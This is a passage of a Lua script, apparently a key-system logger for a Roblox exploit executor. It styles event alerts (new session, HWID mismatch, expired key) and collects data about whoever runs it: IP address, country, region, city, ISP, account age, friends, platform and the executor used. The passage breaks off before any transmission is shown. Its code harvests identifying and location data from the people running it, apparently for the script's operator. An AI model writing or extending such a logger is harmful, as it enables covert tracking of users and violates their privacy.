        login       = { color=0x00C8FF, emoji="🚀", label="New Session"    },
        mismatch    = { color=0xFF3C3C, emoji="🚫", label="HWID Mismatch"  },
        expired     = { color=0xFF8C00, emoji="⏰", label="Key Expired"    },
        session_end = { color=0x778899, emoji="🔌", label="Session Ended"  },
    }
    local s = styles[eventType] or styles.login

    -- ── Collect info ──────────────────────
    local avatar, headshot = getAvatar(PL.UserId)
    local gameName, gameCreator, maxPlayers, placeVer = getGameInfo()

    local ip, ipCountry, ipRegion, ipCity, ipIsp = getIP()

    local platform    = getPlatform()
    local ping        = getPing()
    local accAge      = getAccountAge()
    local membership  = getMembership()
    local friends     = getFriendCount()
    local executor    = getExecutor()
    local serverUp    = getServerUptime()
    local playerCount = getPlayerCount()

